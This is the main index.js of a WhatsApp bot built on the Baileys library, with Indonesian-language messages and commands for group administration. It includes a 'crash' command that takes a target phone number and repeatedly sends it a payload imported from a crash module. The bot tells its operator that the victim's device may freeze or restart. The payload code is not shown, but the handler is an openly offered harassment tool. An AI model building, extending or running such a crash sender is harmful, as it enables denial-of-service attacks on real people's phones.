// index.js
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, Browsers } = require('@whiskeysockets/baileys');
const qrcode = require('qrcode-terminal');
const pino = require('pino');
const fs = require('fs');
const path = require('path');
const config = require('./config.js');

// Import crash function
const { xeoninvisible } = require('./lib/crash.js');
const { showMenu } = require('./handler/menu.js');

let sock = null;
const isPairing = process.argv.includes('--pair');

async function connectToWhatsApp() {
  const { state, saveCreds } = await useMultiFileAuthState(config.sessionName);
  
  sock = makeWASocket({
    auth: state,
    printQRInTerminal: true,
    logger: pino({ level: 'silent' }),
    browser: Browsers.ubuntu('Chrome'),
    
    // Pairing code options
    generatePairingCode: isPairing,
    phoneNumber: isPairing ? config.ownerNumber : undefined,
    
    // Connection settings
    markOnlineOnConnect: true,
    syncFullHistory: false
  });

  sock.ev.on('creds.update', saveCreds);
  
  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect, qr, pairingCode } = update;
    
    if (qr && !isPairing) {
      console.log('Scan QR Code ini:');
      qrcode.generate(qr, { small: true });
    }
    
    if (pairingCode) {
      console.log(`\n🔢 PAIRING CODE: ${pairingCode}`);
      console.log(`📱 Masukin di WhatsApp: Settings → Linked Devices → Link a Device`);
    }
    
    if (connection === 'open') {
      console.log(`✅ ${config.botName} AKTIF!`);
      console.log(`🤖 Owner: ${config.ownerName}`);
      console.log(`🚀 Prefix: ${config.botPrefix}`);
      
      // Send welcome message to owner
      await sock.sendMessage(`${config.ownerNumber}@s.whatsapp.net`, { 
        text: `${config.messages.welcome}\n\nBot Name: ${config.botName}\nVersion: ${config.botVersion}\nPrefix: ${config.botPrefix}` 
      });
    }
    
    if (connection === 'close') {
      const shouldReconnect = lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut;
      console.log(`⚠️ Connection closed, ${shouldReconnect ? 'reconnecting' : 'not reconnecting'}...`);
      if (shouldReconnect) {
        setTimeout(connectToWhatsApp, 5000);
      }
    }
  });
  
  // Message handler
  sock.ev.on('messages.upsert', async (m) => {
    const msg = m.messages[0];
    if (!msg.message || msg.key.fromMe) return;
    
    await handleMessage(msg);
  });
  
  // Group events
  sock.ev.on('group-participants.update', async (update) => {
    const { id, participants, action } = update;
    
    if (action === 'add' && participants.includes(sock.user.id)) {
      console.log(`📥 Bot added to group: ${id}`);
      await sock.sendMessage(id, { text: `${config.messages.groupJoined}\n\nKetik ${config.botPrefix}menu untuk melihat fitur bot!` });
    }
    
    if (action === 'remove' && participants.includes(sock.user.id)) {
      console.log(`📤 Bot removed from group: ${id}`);
    }
  });
  
  return sock;
}

async function handleMessage(msg) {
  try {
    const text = msg.message.conversation || 
                 msg.message.extendedTextMessage?.text || 
                 msg.message.imageMessage?.caption || '';
    const sender = msg.key.remoteJid;
    const fromMe = msg.key.fromMe;
    const isGroup = sender.endsWith('@g.us');
    const pushname = msg.pushName || 'User';
    
    // Command prefix check
    if (!text.startsWith(config.botPrefix)) return;
    
    const command = text.slice(config.botPrefix.length).trim().split(' ')[0].toLowerCase();
    const args = text.slice(config.botPrefix.length + command.length).trim().split(' ');
    
    console.log(`📨 Command: ${command} | From: ${pushname} | Group: ${isGroup}`);
    
    // ==================== CRASH COMMANDS ====================
    if (command === 'crash' && config.enableCrash) {
      if (!args[0]) {
        return sock.sendMessage(sender, { text: `Format: ${config.botPrefix}crash 628xxxxxxx` });
      }
      
      const target = args[0].replace(/\D/g, '');
      if (!target.startsWith('62')) {
        return sock.sendMessage(sender, { text: 'Nomor harus diawali 62 (Indonesia)' });
      }
      
      const targetJid = `${target}@s.whatsapp.net`;
      
      await sock.sendMessage(sender, { text: `💀 MENGIRIM CRASH KE ${target}...` });
      
      try {
        // Kirim crash berkali-kali
        for (let i = 0; i < config.crashRepeat; i++) {
          await xeoninvisible(sock, targetJid);
          console.log(`[${i+1}/${config.crashRepeat}] Crash sent to ${target}`);
          await delay(1000);
        }
        
        await sock.sendMessage(sender, { 
          text: `${config.messages.crashSuccess}\n\nTarget: ${target}\nJumlah: ${config.crashRepeat}x\nStatus: Device mungkin freeze/restart!` 
        });
      } catch (error) {
        console.error('Crash error:', error);
        await sock.sendMessage(sender, { text: config.messages.crashFailed });
      }
    }
    
    // ==================== GROUP COMMANDS ====================
    else if (command === 'menu') {
      await showMenu(sock, sender, pushname);
    }
    
    else if (command === 'kick' && isGroup) {
      if (!msg.message.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
        return sock.sendMessage(sender, { text: `Tag orang yang mau di kick!\nContoh: ${config.botPrefix}kick @orang` });
      }
      
      const target = msg.message.extendedTextMessage.contextInfo.mentionedJid[0];
      try {
        await sock.groupParticipantsUpdate(sender, [target], 'remove');
        await sock.sendMessage(sender, { text: `✅ Berhasil kick @${target.split('@')[0]}` });
      } catch (error) {
        await sock.sendMessage(sender, { text: '❌ Gagal kick, mungkin bot bukan admin atau target admin' });
      }
    }
    
    else if (command === 'add' && isGroup) {
      const number = args[0]?.replace(/\D/g, '');
      if (!number) {
        return sock.sendMessage(sender, { text: `Format: ${config.botPrefix}add 628xxxxxxx` });
      }
      
      try {
        await sock.groupParticipantsUpdate(sender, [`${number}@s.whatsapp.net`], 'add');
        await sock.sendMessage(sender, { text: `✅ Berhasil add ${number}` });
      } catch (error) {
        await sock.sendMessage(sender, { text: '❌ Gagal add member' });
      }
    }
    
    else if (command === 'promote' && isGroup) {
      const target = msg.message.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
      if (!target) {
        return sock.sendMessage(sender, { text: `Tag orang yang mau di promote!\nContoh: ${config.botPrefix}promote @orang` });
      }
      
      try {
        await sock.groupParticipantsUpdate(sender, [target], 'promote');
        await sock.sendMessage(sender, { text: `✅ Berhasil promote @${target.split('@')[0]} jadi admin` });
      } catch (error) {
        await sock.sendMessage(sender, { text: '❌ Gagal promote' });
      }
    }
    
    else if (command === 'demote' && isGroup) {
      const target = msg.message.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
      if (!target) {
        return sock.sendMessage(sender, { text: `Tag admin yang mau di demote!\nContoh: ${config.botPrefix}demote @orang` });
      }
      
      try {
        await sock.groupParticipantsUpdate(sender, [target], 'demote');
        await sock.sendMessage(sender, { text: `✅ Berhasil demote @${target.split('@')[0]}` });
      } catch (error) {
        await sock.sendMessage(sender, { text: '❌ Gagal demote' });
      }
    }
    
    else if (command === 'tagall' && isGroup) {
      try {
        const groupMetadata = await sock.groupMetadata(sender);
        const participants = groupMetadata.participants;
        
        let mentionText = '';
        participants.forEach(participant => {
          mentionText += `@${participant.id.split('@')[0]} `;
        });
        
        await sock.sendMessage(sender, { 
          text: `👥 TAG ALL MEMBER:\n\n${mentionText}`,
          mentions: participants.map(p => p.id)
        });
      } catch (error) {
        await sock.sendMessage(sender, { text: '❌ Gagal tag all' });
      }
    }
    
    else if (command === 'linkgroup' && isGroup) {
      try {
        const code = await sock.groupInviteCode(sender);
        const link = `https://chat.whatsapp.com/${code}`;
        await sock.sendMessage(sender, { text: `🔗 Link Group:\n${link}` });
      } catch (error) {
        await sock.sendMessage(sender, { text: '❌ Gagal mendapatkan link group' });
      }
    }
    
    else if (command === 'infogrup' && isGroup) {
      try {
        const metadata = await sock.groupMetadata(sender);
        const participants = metadata.participants;
        const admins = participants.filter(p => p.admin).map(p => `@${p.id.split('@')[0]}`);
        
        const infoText = `
📊 INFO GRUP:
├─ Nama: ${metadata.subject}
├─ ID: ${metadata.id}
├─ Dibuat: ${new Date(metadata.creation * 1000).toLocaleDateString()}
├─ Jumlah Member: ${participants.length}
├─ Admin (${admins.length}):
${admins.map(a => `│  └─ ${a}`).join('\n')}
└─ Deskripsi: ${metadata.desc || 'Tidak ada'}
        `;
        
        await sock.sendMessage(sender, { text: infoText });
      } catch (error) {
        await sock.sendMessage(sender, { text: '❌ Gagal mendapatkan info grup' });
      }
    }
    
    else if (command === 'ping') {
      const start = Date.now();
      await sock.sendMessage(sender, { text: '🏓 Pong!' });
      const latency = Date.now() - start;
      await sock.sendMessage(sender, { text: `⚡ Latency: ${latency}ms` });
    }
    
    else if (command === 'owner') {
      await sock.sendMessage(sender, { 
        text: `👑 OWNER BOT:\n\nNama: ${config.ownerName}\nNomor: ${config.ownerNumber}\n\nHubungi owner untuk custom bot!` 
      });
    }
    
  } catch (error) {
    console.error('Message handler error:', error);
  }
}

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Start bot
connectToWhatsApp();
